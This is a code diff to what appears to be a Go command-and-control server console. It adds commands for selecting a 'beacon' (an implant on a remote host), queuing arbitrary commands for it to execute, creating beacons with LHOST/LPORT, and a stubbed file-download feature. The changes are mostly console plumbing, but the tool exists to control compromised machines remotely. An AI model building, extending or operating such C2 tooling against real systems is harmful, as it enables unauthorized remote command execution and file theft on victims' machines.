@@ -30,14 +30,16 @@ type Beacon struct {
 }
 
 var beacons []*Beacon = make([]*Beacon, 0)
+var activeBeacon *Beacon
 var cmdArgs = map[string]string {
-    "help": "",
-	"list": "", // lists active beacons
-    "exec": "<beacon-id OR index> <command...>",
+    "help": "<command>...",
+	"list": "",
+    "exec": "<beacon id OR index> <command>...",
     "create": "<LHOST> <LPORT>",
+	"download": "<beacon id OR index> <remote file> <save location> OR <remote file> <save location>...",
+	"use": "<beacon id OR index>",
 }
 
-// to serve management interface
 func interfaceHandler(w http.ResponseWriter, h *http.Request) {
 	json.NewEncoder(w).Encode(map[string]bool{"ok": true})
 }
@@ -59,7 +61,8 @@ func beaconHandler(w http.ResponseWriter, r *http.Request) {
 	if len(update.Data) > 0 {
 		out := strings.Replace(update.Data, "\n", "\n\t", -1)
 		fmt.Println("\n[+] Beacon " + update.Id + "@" + update.Ip + " " + update.Type + ":")
-		fmt.Print("\t" + out[:len(out)-1] + "c2> ")
+		fmt.Println("\t" + out[:len(out)-1])
+		prompt()
 	}
 }
 
@@ -118,35 +121,44 @@ func execOnBeacon(cmd []string) {
 		return	
 	}
 
-	var beacon *Beacon
-			
-	for _, b := range beacons {
-		if b.Id == cmd[1] {
-			beacon = b
-		}
+	var beacon *Beacon = activeBeacon
+	var cmdIndex = 1
+	if beacon == nil {
+		beacon = getBeaconByIdOrIndex(cmd[1])
+		cmdIndex = 2
 	}
 
-	bId, err := strconv.Atoi(cmd[1])
-	
-	if beacon == nil && err != nil {
-		fmt.Println("If using beacon index please only use numbers.")
-		return
-	}
-
-	if beacon != nil || bId < len(beacons) {
-		if beacon == nil {
-			beacon = beacons[bId]
-		}
-
-		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[2:], " "))
+	if beacon != nil {
+		beacon.ExecBuffer = append(beacon.ExecBuffer, strings.Join(cmd[cmdIndex:], " "))
 		fmt.Println("Added exec command to buffer for beacon " + beacon.Id + "@" + beacon.Ip)
 	} else {
 		fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
 	}
 }
 
+func getBeaconByIdOrIndex(id string) (*Beacon) {
+	var beacon *Beacon
+
+	for _, b := range beacons {
+		if b.Id == id {
+			beacon = b
+		}
+	}
+
+	bId, err := strconv.Atoi(id)
+	
+	if beacon != nil || (err == nil && bId < len(beacons)) {
+		if beacon == nil {
+			beacon = beacons[bId]
+		}
+		return beacon
+	} else {
+		return nil
+	}
+}
+
 func checkArgs(cmd[] string) (bool) {
-	amt := len(strings.Fields(cmdArgs[cmd[0]]))
+	amt := strings.Count(cmdArgs[cmd[0]], "<")
 	if len(cmd[1:]) != amt && !strings.Contains(cmdArgs[cmd[0]], "...") {
 		if amt == 1 {
 			fmt.Println(cmd[0] + " requires " + strconv.Itoa(amt) + " arg: " + cmdArgs[cmd[0]])
@@ -156,6 +168,24 @@ func checkArgs(cmd[] string) (bool) {
 		return false
 	}
 	return true
+}
+
+func downloadFile(cmd []string) {
+
+}
+
+func printHelp(cmd []string) {
+	if len(cmd) == 2 {
+		if val, ok := cmdArgs[cmd[1]]; ok {
+			fmt.Println(cmd[1] + " usage: " + strings.ReplaceAll(val, "...", ""))
+		} else {
+			fmt.Println("Command " + cmd[0] + " does not exist.")
+		}
+	} else {
+		for key, val := range cmdArgs {
+			fmt.Println(key + " " + strings.ReplaceAll(val, "...", ""))
+		}
+	}
 }
 
 func processInput(input string) {
@@ -168,18 +198,40 @@ func processInput(input string) {
 			createBeacon(cmd[1], cmd[2])
 		case "list":
 			listBeacons()
+		case "download":
+			downloadFile(cmd)
+		case "use":
+			activeBeacon = getBeaconByIdOrIndex(cmd[1])
+			if activeBeacon == nil {
+				fmt.Println("Beacon " + cmd[1] + " does not exist. Use list to show available beacons.")
+			}
 		case "help":
-			//printHelp(cmd[1:])
+			printHelp(cmd)
 		}
 	}
 }
 
+func prompt() {
+	if activeBeacon != nil {
+		fmt.Print(activeBeacon.Id + "@" + activeBeacon.Ip + " ")
+	}
+
+	fmt.Print("c2> ")
+}
+
 func handleInput() {
 	reader := bufio.NewReader(os.Stdin)
-
+	first := true
 	for {
-		fmt.Print("c2> ")
+		if first {
+			first = false
+		} else {
+			fmt.Println()
+		}
+		
+		prompt()
 		input, err := reader.ReadString('\n')
+
         if err != nil {
             fmt.Fprintln(os.Stderr, err)
         }
